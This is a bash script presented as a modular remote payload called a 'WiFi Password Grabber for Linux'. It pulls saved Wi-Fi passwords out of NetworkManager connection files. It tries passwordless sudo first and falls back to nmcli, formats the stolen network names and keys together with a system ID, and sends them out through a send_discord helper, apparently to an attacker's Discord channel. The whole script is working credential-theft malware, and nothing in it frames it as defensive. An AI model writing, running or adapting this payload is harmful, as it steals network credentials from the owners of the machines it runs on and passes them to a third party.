#!/bin/bash
# ============================================================
# WiFi Password Grabber for Linux - Modular Remote Payload
# ============================================================
# Extracts saved WiFi passwords from NetworkManager
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🔐 **WiFi Passwords from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# Check if running as root or can access NetworkManager
if [[ -d /etc/NetworkManager/system-connections ]]; then
    # Try with sudo (might work if user has passwordless sudo)
    if sudo -n true 2>/dev/null; then
        for file in /etc/NetworkManager/system-connections/*; do
            if [[ -f "$file" ]]; then
                ssid=$(basename "$file")
                psk=$(sudo grep -oP '(?<=psk=).+' "$file" 2>/dev/null)
                if [[ -n "$psk" ]]; then
                    OUTPUT+="📶 **$ssid**\n"
                    OUTPUT+="   🔑 \`$psk\`\n\n"
                fi
            fi
        done
    else
        OUTPUT+="⚠️ Need root access to extract WiFi passwords\n"
        OUTPUT+="Available WiFi networks:\n"
        # List networks without passwords
        nmcli -t -f NAME connection show 2>/dev/null | while read name; do
            OUTPUT+="• $name\n"
        done
    fi
else
    # Try nmcli method (works on some systems)
    OUTPUT+="Attempting nmcli method...\n\n"
    while IFS= read -r ssid; do
        if [[ -n "$ssid" ]]; then
            pass=$(nmcli -s -g 802-11-wireless-security.psk connection show "$ssid" 2>/dev/null)
            OUTPUT+="📶 **$ssid**\n"
            if [[ -n "$pass" ]]; then
                OUTPUT+="   🔑 \`$pass\`\n\n"
            else
                OUTPUT+="   🔑 (password hidden or unavailable)\n\n"
            fi
        fi
    done < <(nmcli -t -f NAME connection show 2>/dev/null)
fi

# Send to Discord
send_discord "$OUTPUT"

